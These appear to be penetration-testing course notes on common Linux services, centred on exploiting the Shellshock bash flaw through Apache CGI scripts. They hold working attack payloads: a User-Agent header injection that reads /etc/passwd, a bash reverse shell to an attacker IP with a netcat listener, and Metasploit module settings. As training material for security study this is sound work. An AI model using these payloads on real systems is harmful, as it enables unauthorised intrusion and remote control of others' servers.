# Linux Vulnerabilities

Linux is an OS which is often found running on servers. This means it is vital for us as penetration testers to understand linux and how to exploit it.

There are some common sevices which are found on linux systems - in this section we will be looking at what these are and how to exploit them.

The following table summarises the services we will look at:

| Service | Ports | Purpose |
| ---|---|---|
| Apache | 80, 443 | Web server which is used on 80% of global web servers |
| SSH | 22 | Secure remote access to control systems across unsecured networks |
| FTP | 21 | File sharing between a client and server and vice-versa |
| SAMBA | 445 | Linux implementation of SMB - allows windows machines to access linux shares and devices and vice-versa |

## Exploiting Apache via CVE-2014-6271 aka Shellshock

The shellshock family of vulnerabilities let attackers execute system commands remotely on a linux system which is vulnerable.

Two services are involved - *apache* and *bash* - which is why we are covering it here in the section relating to exploiting apache.

>[!NOTE]
>Shellshock is hardly ever seen anymore - it was so important it is worthwhile knowing about

### Context

Apache web servers which have been set up to run Common Gateway Interface scripts or .sh scripts could be vulnerable to shellshock.

>[!NOTE]
>CGI scripts are used by Apache to execute commands on the Linux system and show the output to the client

We can develop our own CGI scripts to perform commands on web-servers.

Shellshock takes advantage of this feature of apache along with a vulnerability in older versions of bash which execute commands after the series of characters `() {:;}`

### Exploitation

We need to find a way to communicate with the vulnerable version of bash - this is where CGI scripts come into play. If we can find CGI scripts on the targeted server, we can utilise them to send to bash the series of characters followed by the command we would like to have executed on the remote system.

When we make an html request using a CGI script, the web server will start a new process and execute the script with bash.

We therefore want to keep an eye open for .cgi scripts being used by web applications. We can look in source code to help with this - we might find a GET request is being made to a .cgi script.

We need to also make sure that the server is vulnerable to shellshock. To do this, we can run an nmap script:

```bash
sudo nmap -sV 192.168.56.101 --script=http.shellshock --script-args "http-shellshock.uri=/vulnscript.cgi"
```

>[!NOTE]
>The path to the CGI script is included as the value passed to the `http-shellshock.uri` argument

#### Manual Method

To exploit a shellshock vulnerability manually once we have found one and a .cgi script to use, we can use a proxy server such as burpsuite or zap to intercept a GET request to the CGI script.

The easiest and best place to inject the sequence of characters along with a command which we would like to have executed on the target web-server is in the `User-Agent` http header like so:

```bash
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

If we get success with a command such as `id` or `cat /etc/passwd` we can try different commands to get a reverse shell.

We can start a netcat listener on our attacking machine:

```bash
sudo nc -nlvp 4444
```

We can then try different ways to get a bash reverse shell. One way is shown below:

```bash
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.168.56.108/4444 0>&1'
```

>[!NOTE]
>If the above injection does not work, it is worth URL encoding it and / or trying a different command for the actual reverse shell

#### Automated Exploitation

We can automate the exploitation of a shellshock vulnerability using the msfconsole module `exploit/multi/http/apache_mod_cgi_bash_env_exec`

We will need to set `RHOSTS` and `TARGETURI` - in the example we have been using so far, this would look as follows:

```bash
set RHOSTS 192.168.56.101
set TARGETURI /vulnscript.cgi
run
```

This will (hopefully) give us a meterpreter session on the target system.

